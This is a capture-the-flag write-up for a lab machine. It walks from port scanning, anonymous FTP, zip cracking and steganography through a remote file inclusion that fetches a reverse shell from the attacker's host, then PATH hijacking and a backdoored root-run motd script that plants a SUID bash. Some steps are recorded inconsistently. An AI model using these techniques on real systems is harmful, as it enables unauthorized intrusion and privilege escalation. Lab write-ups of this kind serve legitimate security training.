# IP
172.17.0.2
# Reconnaissance
## Host discovery
``` bash
ping -c 2 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.112 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.050 ms

--- 172.17.0.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1003ms
rtt min/avg/max/mdev = 0.050/0.081/0.112/0.031 ms
```
## Ports scanning
```bash
sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 172.17.0.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-05 11:55 -0300
Nmap scan report for 172.17.0.2
Host is up (0.0000020s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: E6:F4:85:8E:31:F2 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.58 seconds
```
``` bash
sudo nmap -p21,22,80 -sS -sCV -T4 --min-rate 5000 -n -Pn 172.17.0.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-05 11:55 -0300
Nmap scan report for 172.17.0.2
Host is up (0.000025s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0               0 Jul 11  2024 hola_disfruta
|_-rw-r--r--    1 0        0             293 Jul 11  2024 respeta.zip
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:172.17.0.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.7p1 Ubuntu 3ubuntu13.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 63:16:54:2a:05:1d:8e:43:53:55:8b:d5:4e:35:c9:1f (ECDSA)
|_  256 21:24:77:5d:f8:2f:b2:64:ec:42:8b:0b:ef:f0:46:1b (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: E6:F4:85:8E:31:F2 (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.94 seconds
```
# FTP enumeration
## Anonymous login
``` bash
ftp 172.17.0.2
ftp> ls
-rw-r--r--    1 0        0               0 Jul 11  2024 hola_disfruta
-rw-r--r--    1 0        0             293 Jul 11  2024 respeta.zip
ftp> prompt off
ftp> mget *
ftp> bye
```
``` bash
unzip respeta.zip
Archive:  respeta.zip
[respeta.zip] oculto.txt password:
```
## John
``` bash
zip2john respeta.zip > hash.txt
john hash.txt
greenday         (respeta.zip/oculto.txt)
```
``` bash
cat oculto.txt
Consigue la imagen crackpass.jpg
firstatack.github.io
sin fuzzing con logica y observando la sacaras ,muy rapido
```
## Stenography
``` bash
wget https://firstatack.github.io/assets/crackpass.jpg
Saving to: ‘crackpass.jpg’
steghide extract -sf crackpass.jpg
Enter passphrase:
wrote extracted data to "passwd.zip".
unzip passwd.zip
Archive:  passwd.zip
 extracting: pass
cat pass
hackeada:denuevo
```
# Web enumeration
## Dir fuzzing
``` bash
gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -x php,html,jpg
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,html,jpg
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index.php            (Status: 200) [Size: 1116]
index.html           (Status: 200) [Size: 10671]
server-status        (Status: 403) [Size: 275]
Progress: 830564 / 830564 (100.00%)
===============================================================
Finished
===============================================================
```
``` bash
curl -s http://172.17.0.2/index.php
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Mi página web</title>
  <link rel="stylesheet" href="style.css">
<!-- Tuvimos problemas seguridad y hemos aplicado unos pocos cambios
no obstante nos han vuelto a romper -->
 </head>
<body>
  <header>
    <h1>Mi página web</h1>
  </header>

  <main>
    <section id="about">
      <h2>Acerca de mí</h2>
      <p>Aquí puedes poner información sobre ti, tu sitio web o lo que quieras compartir con los visitantes.</p>
    </section>

    <section id="contenido-principal">
      <p>Ejemplo de párrafo de contenido principal.</p>
      <p>Otro párrafo de ejemplo.</p>
    </section>
  </main>

  <aside>
    <h3>Barra lateral</h3>
    <ul>
      <li><a href="vulndb.com">Enlace 1</a></li>
      <li><a href="trackedvuln.dl/">Enlace 2</a></li>
      <li><a href="dockerlabs.es">Enlace 3</a></ºli>
    </ul>
  </aside>

  <footer>
    <p>&copy; 2024 Mi página web</p>
  </footer>
</body>
<!-- este web developer no vale un pingo lo hace todo muy obvio -->
</html>
```
## DNS
To see trackedvuln.dl let's add it to the DNS config
## Dir fuzzing with authorization
``` bash
gobuster dir -u http://trackedvuln.dl/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -x php,html,txt,sql,zip --xl 461 -H "Authorization: Basic $(echo -n 'hackeada:denuevo' | base64)"
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://trackedvuln.dl/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] Exclude Length:          461
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              zip,php,html,txt,sql
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index.html           (Status: 200) [Size: 10672]
index.php            (Status: 200) [Size: 901]
server-status        (Status: 403) [Size: 279]
Progress: 1245846 / 1245846 (100.00%)
===============================================================
Finished
===============================================================
```
## Name Param Fuzzing
``` bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -u http://trackedvuln.dl/index.php?FUZZ=test -H  "Authorization: Basic $(echo -n 'hackeada:denuevo' | base64)" -fs 901

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://trackedvuln.dl/index.php?FUZZ=test
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt
 :: Header           : Authorization: Basic aGFja2VhZGE6ZGVudWV2bw==
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 901
________________________________________________

love                    [Status: 200, Size: 1079, Words: 172, Lines: 40, Duration: 2ms]
:: Progress: [207643/207643] :: Job [1/1] :: 4255 req/sec :: Duration: [0:00:39] :: Errors: 0 ::
```
## Param Fuzzing
``` bash
ffuf -u http://trackedvuln.dl/index.php?love=http://trackedvuln.dl/index.html/FUZZ -H "Authorization: Basic $(echo -n 'hackeada:denuevo' | base64)" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fs 901,1079

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://trackedvuln.dl/index.php?love=http://trackedvuln.dl/index.html/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
 :: Header           : Authorization: Basic aGFja2VhZGE6ZGVudWV2bw==
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 901,1079
________________________________________________

:: Progress: [930/930] :: Job [1/1] :: 106 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```
``` bash
curl -s http://trackedvuln.dl/index.php?love=http://172.17.0.1:8000 -H "Authorization: Basic $(echo -n 'hackeada:denuevo' | base64)"
```
It reaches kali's server
## Reverse shell
``` bash
curl -s http://trackedvuln.dl/index.php?love=http://172.17.0.1:8000/revshell.php -H "Authorization: Basic $(echo -n 'hackeada:denuevo' | base64)"
```
 
# Post enumeration
## Lateral movement from www-data
``` bash
whoami
www-data
sudo -l
(norberto) NOPASSWD: /usr/bin/baner
```
``` bash
/usr/bin/baner
Ejecutando 'head' con ruta absoluta:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync

Ejecutando 'head' con ruta relativa:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```
### Path Hijacking
``` bash
export PATH=/tmp:$PATH
echo '/bin/bash' > /tmp/head
chmod +x /tmp/head
sudo -u norberto /usr/bin/baner
whoami norberto
```
## Lateral movement from norberto
``` bash
cat /home/norberto/.-/.miscredenciales
Hasta aqui no sirvio mi password

⠏⠗⠁⠉⠞⠊⠉⠁⠉⠗⠑⠁⠝⠙⠕⠗⠑⠞⠕⠎

Debes tenerlo a mano te sera util
Usa mis pass para escalar
feliz hack de firstatack
```
This is braile
Translated, the password is **practicacreandoretos**
Login in with SSH
``` bash
ssh norberto@172.17.0.2
whoami
maria
cd /home/maria
cat .mipass
maria:asientiendesmejor
Donde podre escribir
su maria
```
## Lateral movement from maria
``` bash
find / -writable 2>/dev/null | grep -v /proc/
/etc/update-motd.d/00-header
```
This is what is shown when login with SSH. **root** runs the command before switching to the user.
``` bash
cat >> /etc/update-motd.d/00-header << EOF
> cp /bin/bash /tmp/bash
> chmod 4755 /tmp/bash
> EOF
```
``` bash
ssh norberto@172.17.0.2
```
# Root
``` bash
/tmp/bash -p
whoami
root
```
